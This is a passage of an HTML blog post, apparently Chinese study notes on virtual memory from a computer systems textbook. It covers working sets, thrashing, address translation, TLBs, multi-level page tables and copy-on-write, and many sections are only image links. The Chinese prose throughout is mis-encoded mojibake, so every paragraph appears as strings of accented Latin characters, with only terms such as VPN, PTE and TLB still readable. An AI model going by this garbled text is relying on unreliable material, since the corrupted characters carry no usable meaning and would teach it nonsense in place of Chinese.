href="#935-åˆ†é…é¡µé¢"></a> 9.3.5 åˆ†é…é¡µé¢</h4><p><img src="/posts/e0eae192/image-20210616212903869.png" alt="image-20210616212903869"></p><h4 id="936-åˆæ˜¯å±€éƒ¨æ€§æ•‘äº†æˆ‘ä»¬"><a class="markdownIt-Anchor" href="#936-åˆæ˜¯å±€éƒ¨æ€§æ•‘äº†æˆ‘ä»¬"></a> 9.3.6 åˆæ˜¯å±€éƒ¨æ€§æ•‘äº†æˆ‘ä»¬</h4><p>å°½ç®¡åœ¨æ•´ä¸ªè¿è¡Œè¿‡ç¨‹ä¸­ç¨‹åºå¼•ç”¨çš„ä¸åŒé¡µé¢çš„æ€»æ•°å¯èƒ½è¶…å‡ºç‰©ç†å­˜å‚¨å™¨æ€»çš„å¤§å°ï¼Œä½†æ˜¯å±€éƒ¨æ€§åŸåˆ™ä¿è¯äº†åœ¨ä»»æ„æ—¶åˆ»ï¼Œç¨‹åºå°†å¾€å¾€åœ¨ä¸€ä¸ªè¾ƒå°çš„æ´»åŠ¨é¡µé¢( active page)é›†åˆä¸Šå·¥ä½œï¼Œè¿™ä¸ªé›†åˆå«åšå·¥ä½œé›†( working set)æˆ–è€…å¸¸é©»é›†( resident set)ã€‚åœ¨åˆå§‹å¼€é”€ï¼Œä¹Ÿå°±æ˜¯å°†å·¥ä½œé›†é¡µé¢è°ƒåº¦åˆ°å­˜å‚¨å™¨ä¸­ä¹‹åï¼Œæ¥ä¸‹æ¥å¯¹è¿™ä¸ªå·¥ä½œé›†çš„å¼•ç”¨å°†å¯¼è‡´å‘½ä¸­ï¼Œè€Œä¸ä¼šäº§ç”Ÿé¢å¤–çš„ç£ç›˜æµé‡</p><p>å¦‚æœå·¥ä½œé›†çš„å¤§å°è¶…å‡ºäº†ç‰©ç†å­˜å‚¨å™¨çš„å¤§å°ï¼Œé‚£ä¹ˆç¨‹åºå°†äº§ç”Ÿä¸€ç§ä¸å¹¸çš„çŠ¶æ€ï¼Œå«åš<strong>é¢ ç°¸(</strong> thrashing),è¿™æ—¶é¡µé¢å°†ä¸æ–­åœ°<br>æ¢è¿›æ¢å‡ºã€‚è™½ç„¶è™šæ‹Ÿå­˜å‚¨å™¨é€šå¸¸æ˜¯æœ‰æ•ˆçš„ï¼Œä½†ä¼šå¾ˆæ…¢ã€‚</p><hr><h3 id="94-è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºå­˜å‚¨å™¨ç®¡ç†çš„å·¥å…·"><a class="markdownIt-Anchor" href="#94-è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºå­˜å‚¨å™¨ç®¡ç†çš„å·¥å…·"></a> 9.4 è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºå­˜å‚¨å™¨ç®¡ç†çš„å·¥å…·</h3><p>VMç®€åŒ–äº†é“¾æ¥å’ŒåŠ è½½ã€ä»£ç å’Œæ•°æ®å…±äº«ï¼Œä»¥åŠåº”ç”¨ç¨‹åºçš„å­˜å‚¨å™¨åˆ†é…ã€‚</p><ul><li><strong>ç®€åŒ–é“¾æ¥</strong>ã€‚ç‹¬ç«‹çš„åœ°å€ç©ºé—´å…è®¸æ¯ä¸ªè¿›ç¨‹çš„å­˜å‚¨å™¨æ˜ åƒä½¿ç”¨ç›¸åŒçš„åŸºæœ¬æ ¼å¼ï¼Œè€Œä¸ç®¡ä»£ç å’Œæ•°æ®å®é™…å­˜æ”¾åœ¨ç‰©ç†å­˜å‚¨å™¨çš„ä½•å¤„ã€‚ä¾‹å¦‚ï¼Œåƒæˆ‘ä»¬åœ¨å›¾813ä¸­çœ‹åˆ°çš„ï¼Œä¸ªç»™å®šçš„Linuxç³»ç»Ÿä¸Šçš„æ¯ä¸ªè¿›ç¨‹éƒ½ä½¿ç”¨ç±»ä¼¼çš„å­˜å‚¨å™¨æ ¼å¼ã€‚æ–‡æœ¬èŠ‚æ€»æ˜¯ä»è™›æ‹Ÿåœ°å€0x08048000å¤„å¼€å§‹(å¯¹äº32ä½åœ°å€ç©ºé—´)ï¼Œæˆ–è€…ä»0x400000å¤„å¼€å§‹(å¯¹äº64ä½åœ°å€ç©ºé—´)ã€‚æ•°æ®å’ŒèŠ‚ç´§è·Ÿåœ¨æ–‡æœ¬èŠ‚åé¢ã€‚æ ˆå æ®è¿›ç¨‹åœ°å€ç©ºé—´æœ€é«˜çš„éƒ¨åˆ†ï¼Œå¹¶å‘ä¸‹ç”Ÿé•¿ã€‚è¿™æ ·çš„ä¸€è‡´æ€§æå¤§åœ°ç®€åŒ–äº†é“¾æ¥å™¨çš„è®¾è®¡å’Œå®ç°ï¼Œå…è®¸é“¾æ¥å™¨ç”Ÿæˆå…¨é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™äº›å¯æ‰§è¡Œæ–‡ä»¶æ˜¯ç‹¬ç«‹äºç‰©ç†å­˜å‚¨å™¨ä¸­ä»£ç å’Œæ•°æ®çš„æœ€ç»ˆä½ç½®çš„ã€‚</li><li><strong>ç®€åŒ–åŠ è½½</strong>ã€‚è™šæ‹Ÿå­˜å‚¨å™¨è¿˜ä½¿å¾—å®¹æ˜“å‘å­˜å‚¨å™¨ä¸­åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶å’Œå…±äº«å¯¹è±¡æ–‡ä»¶ã€‚å›æƒ³ä¸€ä¸‹ç¬¬7ç« ï¼Œåœ¨ELFå¯æ‰§è¡Œæ–‡ä»¶ä¸­.textå’Œ.dataèŠ‚æ˜¯è¿ç»­çš„ã€‚è¦æŠŠè¿™äº›èŠ‚åŠ è½½åˆ°ä¸€ä¸ªæ–°åˆ›å»ºçš„è¿›ç¨‹ä¸­ï¼Œ LinuxåŠ è½½å™¨åˆ†é…è™šæ‹Ÿé¡µçš„ä¸€ä¸ªè¿ç»­çš„ç‰‡(chunk),ä»åœ°å€0x08048000å¤„å¼€å§‹(å¯¹äº32ä½åœ°å€ç©ºé—´)ï¼Œæˆ–è€…ä»0x400000å¤„å¼€å§‹(å¯¹äº64ä½åœ°å€ç©ºé—´)ï¼ŒæŠŠè¿™äº›è™šæ‹Ÿé¡µæ ‡è®°ä¸ºæ— æ•ˆçš„ï¼ˆå³æœªè¢«ç¼“å­˜çš„ï¼‰ï¼Œå°†é¡µè¡¨æ¡ç›®æŒ‡å‘ç›®æ ‡æ–‡ä»¶ä¸­é€‚å½“çš„ä½ç½®ã€‚æœ‰è¶£çš„æ˜¯ï¼ŒåŠ è½½å™¨ä»ä¸å®é™…æ‹·è´ä»»ä½•æ•°æ®ä»ç£ç›˜åˆ°å­˜å‚¨å™¨ã€‚åœ¨æ¯ä¸ªé¡µåˆæ¬¡è¢«å¼•ç”¨æ—¶ï¼Œè¦ä¹ˆæ˜¯CPUå–æŒ‡ä»¤æ—¶å¼•ç”¨çš„ï¼Œè¦ä¹ˆæ˜¯ä¸€æ¡æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤å¼•ç”¨ä¸€ä¸ªå­˜å‚¨å™¨ä½ç½®æ—¶å¼•ç”¨çš„ï¼Œè™šæ‹Ÿå­˜å‚¨å™¨ç³»ç»Ÿä¼šæŒ‰ç…§éœ€è¦è‡ªåŠ¨åœ°è°ƒå…¥æ•°æ®é¡µã€‚</li><li><strong>ç®€åŒ–å…±äº«</strong>ã€‚ç‹¬ç«‹åœ°å€ç©ºé—´ä¸ºæ“ä½œç³»ç»Ÿæä¾›äº†ä¸€ä¸ªç®¡ç†ç”¨æˆ·è¿›ç¨‹å’Œæ“ä½œç³»ç»Ÿè‡ªèº«ä¹‹é—´å…±äº«çš„è‡´æœºåˆ¶ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç§æœ‰çš„ä»£ç ã€æ•°æ®ã€å †ä»¥åŠæ ˆåŒºåŸŸï¼Œæ˜¯ä¸å’Œå…¶ä»–è¿›ç¨‹å…±äº«çš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ“ä½œç³»ç»Ÿåˆ›å»ºé¡µè¡¨ï¼Œå°†ç›¸åº”çš„è™šæ‹Ÿé¡µæ˜ å°„åˆ°ä¸åŒçš„ç‰©ç†é¡µé¢ã€‚</li><li><strong>ç®€åŒ–å­˜å‚¨å™¨åˆ†é…</strong>ã€‚è™šæ‹Ÿå­˜å‚¨å™¨ä¸ºå‘ç”¨æˆ·è¿›ç¨‹æä¾›ä¸€ä¸ªç®€å•çš„åˆ†é…é¢å¤–å­˜å‚¨å™¨çš„æœºåˆ¶ã€‚å½“ä¸ªè¿è¡Œåœ¨ç”¨æˆ·è¿›ç¨‹ä¸­çš„ç¨‹åºè¦æ±‚é¢å¤–çš„å †ç©ºé—´æ—¶(å¦‚è°ƒç”¨ma11ocçš„ç»“æœ)ï¼Œæ“ä½œç³»ç»Ÿåˆ†é…ä¸€ä¸ªé€‚å½“æ•°å­—(ä¾‹å¦‚k)ä¸ªè¿ç»­çš„è™šæ‹Ÿå­˜å‚¨å™¨é¡µé¢ï¼Œå¹¶ä¸”å°†å®ƒä»¬æ˜ å°„åˆ°ç‰©ç†å­˜å‚¨å™¨ä¸­ä»»æ„ä½ç½®çš„kä¸ªä»»æ„çš„ç‰©ç†é¡µé¢ã€‚ç”±äºé¡µè¡¨å·¥ä½œçš„æ–¹å¼ï¼Œæ“ä½œç³»ç»Ÿæ²¡æœ‰å¿…è¦åˆ†é…kä¸ªè¿ç»­çš„ç‰©ç†å­˜å‚¨å™¨é¡µé¢ã€‚é¡µé¢å¯ä»¥éšæœºåœ°åˆ†æ•£åœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­ã€‚</li></ul><hr><h3 id="95-è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºå­˜å‚¨å™¨ä¿æŠ¤çš„å·¥å…·"><a class="markdownIt-Anchor" href="#95-è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºå­˜å‚¨å™¨ä¿æŠ¤çš„å·¥å…·"></a> 9.5 è™šæ‹Ÿå­˜å‚¨å™¨ä½œä¸ºå­˜å‚¨å™¨ä¿æŠ¤çš„å·¥å…·</h3><p><img src="/posts/e0eae192/image-20210616214509999.png" alt="image-20210616214509999"></p><p><img src="/posts/e0eae192/image-20210616214520599.png" alt="image-20210616214520599"></p><p><img src="/posts/e0eae192/image-20210616214457345.png" alt="image-20210616214457345"></p><hr><h3 id="96-åœ°å€ç¿»è¯‘"><a class="markdownIt-Anchor" href="#96-åœ°å€ç¿»è¯‘"></a> 9.6 åœ°å€ç¿»è¯‘</h3><p><img src="/posts/e0eae192/image-20210617120441290.png" alt="image-20210617120441290">åœ°å€ç¿»è¯‘æ˜¯ä¸€ä¸ªNå…ƒç´ çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼ˆVAS)ä¸­çš„å…ƒç´ å’Œä¸€ä¸ªMå…ƒç´ çš„ç‰©ç†åœ°å€ç©ºé—´ï¼ˆPAS)ä¸­å…ƒç´ ä¹‹é—´çš„æ˜ å°„ï¼Œ</p><p><img src="/posts/e0eae192/image-20210618142508589.png" alt="image-20210618142508589"></p><p><strong>MMUå¦‚ä½•åˆ©ç”¨é¡µè¡¨æ¥å®ç°è¿™ç§æ˜ å°„:</strong></p><p>CPUä¸­çš„ä¸€ä¸ªæ§åˆ¶å¯„å­˜å™¨ï¼Œ<strong>é¡µè¡¨åŸºå€å¯„å­˜å™¨</strong>( Page Table Base Register,PTBR)æŒ‡å‘å½“å‰é¡µè¡¨ã€‚</p><p>nä½çš„è™šæ‹Ÿåœ°å€åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šä¸€ä¸ªpä½çš„<strong>è™šæ‹Ÿé¡µé¢åç§»</strong>( Virtual Page Offset,<strong>VPO</strong>)å’Œä¸€ä¸ª(n-p)ä½çš„<strong>è™šæ‹Ÿé¡µå·</strong>ï¼ˆ Virtual Page Number,<strong>VPN</strong>).</p><p>MMUåˆ©ç”¨VPNæ¥é€‰æ‹©é€‚å½“çš„PTEã€‚ä¾‹å¦‚ï¼ŒVPN0é€‰æ‹©PTE0,VPN1é€‰æ‹©PTE1,ä»¥æ­¤ç±»æ¨ã€‚</p><p>å°†é¡µè¡¨æ¡ç›®ä¸­<strong>ç‰©ç†é¡µå·</strong>( Physical Page Number,PPN)å’Œè™šæ‹Ÿåœ°å€ä¸­çš„<strong>VPO</strong>ä¸²è”èµ·æ¥ï¼Œå°±å¾—åˆ°ç›¸åº”çš„ç‰©ç†åœ°å€ã€‚</p><p>æ³¨æ„ï¼Œå› ä¸ºç‰©ç†å’Œè™šæ‹Ÿé¡µé¢éƒ½æ˜¯På­—èŠ‚çš„ï¼Œæ‰€ä»¥<strong>ç‰©ç†é¡µé¢</strong><br><strong>åç§»</strong>( Physical Page Offset,PPO)å’ŒVPOæ˜¯ç›¸åŒçš„ã€‚</p><p><img src="/posts/e0eae192/image-20210618142837272.png" alt="image-20210618142837272"></p><p><strong>å½“é¡µé¢å‘½ä¸­æ—¶ï¼ŒCPUç¡¬ä»¶æ‰§è¡Œçš„æ­¥éª¤:</strong></p><p><img src="/posts/e0eae192/image-20210618143403713.png" alt="image-20210618143403713"></p><ul><li>ç¬¬ä¸€æ­¥ï¼šå¤„ç†å™¨ç”Ÿæˆä¸€ä¸ªè™šæ‹Ÿåœ°å€ï¼Œå¹¶æŠŠå®ƒä¼ é€ç»™MMU</li><li>ç¬¬äºŒæ­¥ï¼šMMUç”ŸæˆPTEåœ°å€ï¼Œå¹¶ä»é«˜é€Ÿç¼“å­˜/ä¸»å­˜è¯·æ±‚å¾—åˆ°å®ƒã€‚</li><li>ç¬¬ä¸‰æ­¥ï¼šé«˜é€Ÿç¼“å­˜/ä¸»å­˜å‘MMUè¿”å›PTE.</li><li>ç¬¬å››æ­¥ï¼šMMUæ„é€ ç‰©ç†åœ°å€ï¼Œå¹¶æŠŠå®ƒä¼ é€ç»™é«˜é€Ÿç¼“å­˜/ä¸»å­˜ã€‚</li><li>ç¬¬äº”æ­¥ï¼šé«˜é€Ÿç¼“å­˜/ä¸»å­˜è¿”å›æ‰€è¯·æ±‚çš„æ•°æ®å­—ç»™å¤„ç†å™¨ã€‚</li></ul><p>é¡µé¢å‘½ä¸­å®Œå…¨æ˜¯ç”±ç¡¬ä»¶æ¥å¤„ç†çš„ï¼Œä¸ä¹‹ä¸åŒçš„æ˜¯ï¼Œ<strong>å¤„ç†ç¼ºé¡µ</strong>è¦æ±‚ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿå†…æ ¸åä½œå®Œæˆ:</p><p><img src="/posts/e0eae192/image-20210618143420468.png" alt="image-20210618143420468"></p><ul><li>ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ï¼šå’Œå›¾9-13aä¸­çš„ç¬¬ä¸€æ­¥åˆ°ç¬¬ä¸‰æ­¥ç›¸åŒã€‚</li><li>ç¬¬å››æ­¥ï¼šPTEä¸­çš„æœ‰æ•ˆä½æ˜¯é›¶ï¼Œæ‰€ä»¥MMUè§¦å‘äº†ä¸€æ¬¡å¼‚å¸¸ï¼Œä¼ é€’CPUä¸­çš„æ§åˆ¶åˆ°æ“ä½œç³»ç»Ÿå†…æ ¸ä¸­çš„ç¼ºé¡µå¼‚å¸¸å¤„ç†ç¨‹åºã€‚</li><li>ç¬¬äº”æ­¥ï¼šç¼ºé¡µå¤„ç†ç¨‹åºç¡®å®šå‡ºç‰©ç†å­˜å‚¨å™¨ä¸­çš„ç‰ºç‰²é¡µï¼Œå¦‚æœè¿™ä¸ªé¡µé¢å·²ç»è¢«ä¿®æ”¹äº†ï¼Œåˆ™æŠŠå®ƒæ¢å‡ºåˆ°ç£ç›˜ã€‚</li><li>ç¬¬å…­æ­¥ï¼šç¼ºé¡µå¤„ç†ç¨‹åºé¡µé¢è°ƒå…¥æ–°çš„é¡µé¢ï¼Œå¹¶æ›´æ–°å­˜å‚¨å™¨ä¸­çš„PTE.</li><li>ç¬¬ä¸ƒæ­¥ï¼šç¼ºé¡µå¤„ç†ç¨‹åºè¿”å›åˆ°åŸæ¥çš„è¿›ç¨‹ï¼Œå†æ¬¡æ‰§è¡Œå¯¼è‡´ç¼ºé¡µçš„æŒ‡ä»¤ã€‚CPUå°†å¼•èµ·ç¼ºé¡µçš„è™šæ‹Ÿåœ°å€é‡æ–°å‘é€ç»™MMUã€‚å› ä¸ºè™šæ‹Ÿé¡µé¢ç°åœ¨ç¼“å­˜åœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­ï¼Œæ‰€ä»¥å°±ä¼šå‘½ä¸­ï¼Œåœ¨MMUæ‰§è¡Œäº†å›¾9-13bä¸­çš„æ­¥éª¤ä¹‹åï¼Œä¸»å­˜å°±ä¼šå°†æ‰€è¯·æ±‚å­—è¿”å›ç»™å¤„ç†å™¨ã€‚</li></ul><h4 id="961-ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå­˜å‚¨å™¨"><a class="markdownIt-Anchor" href="#961-ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå­˜å‚¨å™¨"></a> 9.6.1 ç»“åˆé«˜é€Ÿç¼“å­˜å’Œè™šæ‹Ÿå­˜å‚¨å™¨</h4><p>å›¾9-14å±•ç¤ºäº†<strong>ä¸€ä¸ªç‰©ç†å¯»å€çš„é«˜é€Ÿç¼“å­˜å¦‚ä½•å’Œè™šæ‹Ÿå­˜å‚¨å™¨ç»“åˆèµ·æ¥</strong>ã€‚ä¸»è¦çš„æ€è·¯æ˜¯åœ°å€ç¿»è¯‘å‘ç”Ÿåœ¨é«˜é€Ÿç¼“å­˜æŸ»æ‰¾ä¹‹å‰ã€‚æ³¨æ„ï¼Œé¡µè¡¨æ¡ç›®å¯ä»¥ç¼“å­˜ï¼Œå°±åƒå…¶ä»–çš„æ•°æ®å­—ä¸€æ ·ã€‚</p><p><img src="/posts/e0eae192/image-20210618144221444.png" alt="image-20210618144221444"></p><h4 id="962-åˆ©ç”¨tlbåŠ é€Ÿåœ°å€ç¿»è¯‘"><a class="markdownIt-Anchor" href="#962-åˆ©ç”¨tlbåŠ é€Ÿåœ°å€ç¿»è¯‘"></a> 9.6.2 åˆ©ç”¨TLBåŠ é€Ÿåœ°å€ç¿»è¯‘</h4><p>**ç¿»è¯‘åå¤‡ç¼“å†²å™¨ï¼ˆTLBï¼‰ï¼š**è®¸å¤šç³»ç»Ÿä¸ºäº†æ¶ˆé™¤å­˜å‚¨å™¨è¯»æ•°æ®çš„å¼€é”€ï¼Œå®ƒä»¬åœ¨MMUä¸­åŒ…æ‹¬äº†ä¸€ä¸ªå…³äºPTEçš„å°çš„ç¼“å­˜ã€‚</p><p>å®ƒç”¨äºç»„é€‰æ‹©å’Œè¡ŒåŒ¹é…çš„ç´¢å¼•å’Œæ ‡è®°å­—æ®µæ˜¯ä»è™šæ‹Ÿåœ°å€ä¸­<br>çš„è™šæ‹Ÿé¡µå·ä¸­æå–å‡ºæ¥çš„ã€‚å¦‚æœTLBæœ‰T=2<sup>t</sup>ä¸ªç»„ï¼Œé‚£ä¹ˆTLBç´¢å¼•(TLBI)æ˜¯ç”±VPNçš„tä¸ªæœ€ä½ä½ç»„æˆçš„ï¼Œè€ŒTLBæ ‡è®°(TLBT)æ˜¯ç”±VPNä¸­å‰©ä½™çš„ä½ç»„æˆçš„ã€‚</p><p><img src="/posts/e0eae192/image-20210618145747729.png" alt="image-20210618145747729"></p><p><img src="/posts/e0eae192/image-20210618145533203.png" alt="image-20210618145533203"></p><p><strong>TLBå‘½ä¸­æ—¶çš„æ­¥éª¤ï¼š</strong></p><ul><li>ç¬¬ä¸€æ­¥ï¼šCPUäº§ç”Ÿä¸€ä¸ªè™šæ‹Ÿåœ°å€ã€‚</li><li>ç¬¬äºŒæ­¥å’Œç¬¬ä¸‰æ­¥ï¼šMMUä»TLBä¸­å–å‡ºç›¸åº”çš„PTE.</li><li>ç¬¬å››æ­¥ï¼šMMUå°†è¿™ä¸ªè™šæ‹Ÿåœ°å€ç¿»è¯‘æˆä¸€ä¸ªç‰©ç†åœ°å€ï¼Œå¹¶ä¸”å°†å®ƒå‘é€åˆ°é«˜é€Ÿç¼“å­˜/ä¸»å­˜ã€‚</li><li>ç¬¬äº”æ­¥ï¼šé«˜é€Ÿç¼“å­˜/ä¸»å­˜å°†æ‰€è¯·æ±‚çš„æ•°æ®å­—è¿”å›ç»™CPU.</li></ul><p>å½“TLBä¸å‘½ä¸­æ—¶ï¼ŒMMUå¿…é¡»ä»L1ç¼“å­˜ä¸­å–å‡ºç›¸åº”çš„PTE,å¦‚å›¾9-16bæ‰€ç¤ºã€‚æ–°å–å‡ºçš„PTEå­˜æ”¾åœ¨TLBä¸­ï¼Œå¯èƒ½ä¼šè¦†ç›–ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ¡ç›®ã€‚</p><h4 id="963-å¤šçº§é¡µè¡¨"><a class="markdownIt-Anchor" href="#963-å¤šçº§é¡µè¡¨"></a> 9.6.3 å¤šçº§é¡µè¡¨</h4><p><strong>ä¸€çº§é¡µè¡¨</strong>ä¸­çš„æ¯ä¸ªPTEè´Ÿè´£æ˜ å°„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¸€ä¸ª4MBçš„ç‰‡( chunk),è¿™é‡Œæ¯ä¸€ç‰‡éƒ½æ˜¯ç”±1024ä¸ªè¿ç»­çš„é¡µé¢ç»„æˆçš„ã€‚æ¯”å¦‚ï¼ŒPTE0æ˜ å°„ç¬¬ä¸€ç‰‡ï¼ŒPTE1æ˜ å°„æ¥ä¸‹æ¥çš„ä¸€ç‰‡ï¼Œä»¥æ­¤ç±»æ¨ã€‚å‡è®¾åœ°å€ç©ºé—´æ˜¯4GB,1024ä¸ªPTEå·²ç»è¶³å¤Ÿè¦†ç›–æ•´ä¸ªç©ºé—´äº†ã€‚</p><p><strong>äºŒçº§é¡µè¡¨</strong>ä¸­çš„æ¯ä¸ªPTEéƒ½è´Ÿè´£æ˜ å°„ä¸€ä¸ª4KBçš„è™šæ‹Ÿå­˜å‚¨å™¨é¡µé¢ï¼Œå°±åƒæˆ‘ä»¬æŸ»çœ‹åªæœ‰ä¸€çº§çš„é¡µè¡¨ä¸€æ ·ã€‚æ³¨æ„ï¼Œä½¿ç”¨4å­—èŠ‚çš„PTE,æ¯ä¸ªä¸€çº§å’ŒäºŒçº§é¡µè¡¨éƒ½æ˜¯4KBå­—èŠ‚ï¼Œè¿™åˆšå¥½å’Œä¸€ä¸ªé¡µé¢<br>çš„å¤§å°æ˜¯ä¸€æ ·çš„ã€‚</p><p><img src="/posts/e0eae192/image-20210618152422961.png" alt="image-20210618152422961"></p><p>è¿™ç§æ–¹æ³•ä»<strong>ä¸¤ä¸ªæ–¹é¢å‡å°‘äº†å­˜å‚¨å™¨è¦æ±‚ï¼š</strong></p><ul><li>ç¬¬ä¸€ï¼Œå¦‚æœä¸€çº§é¡µè¡¨ä¸­çš„ä¸€ä¸ªPTEæ˜¯ç©ºçš„ï¼Œé‚£ä¹ˆç›¸åº”çš„äºŒçº§é¡µè¡¨å°±æ ¹æœ¬ä¸ä¼šå­˜åœ¨ï¼Œè¿™ä»£è¡¨ç€ä¸€ç§å·¨å¤§çš„æ½œåœ¨èŠ‚çº¦ï¼Œå› ä¸ºå¯¹äºä¸€ä¸ªå…¸å‹çš„ç¨‹åºï¼Œ4GBçš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„å¤§éƒ¨åˆ†éƒ½å°†æ˜¯æœªåˆ†é…çš„ã€‚</li><li>ç¬¬äºŒï¼Œåªæœ‰ä¸€çº§é¡µè¡¨æ‰éœ€è¦æ€»æ˜¯åœ¨ä¸»å­˜ä¸­ï¼›è™šæ‹Ÿå­˜å‚¨å™¨ç³»ç»Ÿå¯ä»¥åœ¨éœ€è¦æ—¶åˆ›å»ºã€é¡µé¢è°ƒå…¥æˆ–è°ƒå‡ºäºŒçº§é¡µè¡¨ï¼Œè¿™å°±å‡å°‘äº†ä¸»å­˜çš„å‹åŠ›ï¼›åªæœ‰æœ€ç»å¸¸ä½¿ç”¨çš„äºŒçº§é¡µè¡¨æ‰éœ€è¦ç¼“å­˜åœ¨ä¸»å­˜ä¸­</li></ul><p><img src="/posts/e0eae192/image-20210618152610119.png" alt="image-20210618152610119"></p><h4 id="964-ç»¼åˆç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘"><a class="markdownIt-Anchor" href="#964-ç»¼åˆç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘"></a> 9.6.4 ç»¼åˆï¼šç«¯åˆ°ç«¯çš„åœ°å€ç¿»è¯‘</h4><p><img src="/posts/e0eae192/image-20210619114131611.png" alt="image-20210619114131611"></p><p><img src="/posts/e0eae192/image-20210619114151547.png" alt="image-20210619114151547"></p><p><img src="/posts/e0eae192/image-20210619114205017.png" alt="image-20210619114205017"></p><p><img src="/posts/e0eae192/image-20210619114233781.png" alt="image-20210619114233781"></p><p><img src="/posts/e0eae192/image-20210619114250559.png" alt="image-20210619114250559"></p><hr><h3 id="97-æ¡ˆä¾‹ç ”ç©¶-intel-core-i7-linuxå­˜å‚¨å™¨ç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#97-æ¡ˆä¾‹ç ”ç©¶-intel-core-i7-linuxå­˜å‚¨å™¨ç³»ç»Ÿ"></a> 9.7 æ¡ˆä¾‹ç ”ç©¶ï¼š Intel Core i7/ Linuxå­˜å‚¨å™¨ç³»ç»Ÿ</h3><hr><h3 id="98-å­˜å‚¨å™¨æ˜ å°„"><a class="markdownIt-Anchor" href="#98-å­˜å‚¨å™¨æ˜ å°„"></a> 9.8 å­˜å‚¨å™¨æ˜ å°„</h3><h4 id="981-å†çœ‹å…±äº¨å¯¹è±¡"><a class="markdownIt-Anchor" href="#981-å†çœ‹å…±äº¨å¯¹è±¡"></a> 9.8.1 å†çœ‹å…±äº¨å¯¹è±¡</h4><p>ä¸€ä¸ªå¯¹è±¡å¯ä»¥è¢«æ˜ å°„åˆ°è™šæ‹Ÿå­˜å‚¨å™¨çš„ä¸€ä¸ªåŒºåŸŸï¼Œè¦ä¹ˆä½œä¸º<strong>å…±äº«å¯¹è±¡</strong>ï¼Œè¦ä¹ˆä½œä¸º<strong>ç§æœ‰å¯¹è±¡</strong>ã€‚</p><p>å¦‚æœä¸€ä¸ªè¿›ç¨‹å°†ä¸€ä¸ª<strong>å…±äº«å¯¹è±¡</strong>æ˜ å°„åˆ°å®ƒçš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€ä¸ªåŒºåŸŸå†…ï¼Œé‚£ä¹ˆè¿™ä¸ªè¿›ç¨‹å¯¹è¿™ä¸ªåŒºåŸŸçš„ä»»ä½•å†™æ“ä½œï¼Œå¯¹äºé‚£äº›ä¹ŸæŠŠè¿™ä¸ªå…±äº«å¯¹è±¡æ˜ å°„åˆ°å®ƒä»¬è™šæ‹Ÿå­˜å‚¨å™¨çš„å…¶ä»–è¿›ç¨‹è€Œè¨€ä¹Ÿæ˜¯å¯è§çš„ã€‚è€Œä¸”ï¼Œè¿™äº›å˜åŒ–ä¹Ÿä¼šåæ˜ åœ¨ç£ç›˜ä¸Šçš„åŸå§‹å¯¹è±¡ä¸­ã€‚<br>å¦ä¸€æ–¹é¢ï¼Œå¯¹ä¸€ä¸ªæ˜ å°„åˆ°<strong>ç§æœ‰å¯¹è±¡</strong>çš„åŒºåŸŸåšçš„æ”¹å˜ï¼Œå¯¹äºå…¶ä»–è¿›ç¨‹æ¥è¯´æ˜¯ä¸å¯è§çš„ï¼Œå¹¶ä¸”è¿›ç¨‹å¯¹è¿™ä¸ªåŒºåŸŸæ‰€åšçš„ä»»ä½•å†™æ“ä½œéƒ½ä¸ä¼šåæ˜ åœ¨ç£ç›˜ä¸Šçš„å¯¹è±¡ä¸­ã€‚ä¸€ä¸ªæ˜ å°„åˆ°å…±äº«å¯¹è±¡çš„è™šæ‹Ÿå­˜å‚¨å™¨åŒºåŸŸå«åšå…±äº«åŒºåŸŸã€‚ç±»ä¼¼åœ°ï¼Œä¹Ÿæœ‰ç§æœ‰åŒºåŸŸã€‚</p><p><img src="/posts/e0eae192/image-20210621163041564.png" alt="image-20210621163041564"></p><p><strong>å†™æ—¶æ‹·è´</strong></p><p>ç§æœ‰å¯¹è±¡æ˜¯ä½¿ç”¨ä¸€ç§å«åš<strong>å†™æ—¶æ‹·è´</strong>(copy-on- write)çš„å·§å¦™æŠ€æœ¯è¢«æ˜ å°„åˆ°è™šæ‹Ÿå­˜å‚¨å™¨ä¸­çš„ã€‚<br>ä¸€ä¸ªç§æœ‰å¯¹è±¡å¼€å§‹ç”Ÿå‘½å‘¨æœŸçš„æ–¹å¼åŸºæœ¬ä¸Šä¸å…±äº«å¯¹è±¡çš„ä¸€æ ·ï¼Œåœ¨ç‰©ç†å­˜å‚¨å™¨ä¸­åªä¿å­˜æœ‰ç§æœ‰å¯¹è±¡çš„ä¸€ä»½æ‹·è´ã€‚æ¯”å¦‚ï¼Œå›¾9-30aå±•ç¤ºäº†ä¸€ç§æƒ…å†µï¼Œå…¶ä¸­ä¸¤ä¸ªè¿›ç¨‹å°†ä¸€ä¸ªç§æœ‰å¯¹è±¡æ˜ å°„åˆ°å®ƒä»¬è™šæ‹Ÿå­˜å‚¨å™¨çš„ä¸åŒåŒºåŸï¼Œä½†æ˜¯å…±äº«è¿™ä¸ªå¯¹è±¡åŒä¸€ä¸ªç‰©ç†æ‹·è´ã€‚å¯¹äºæ¯ä¸ªæ˜ 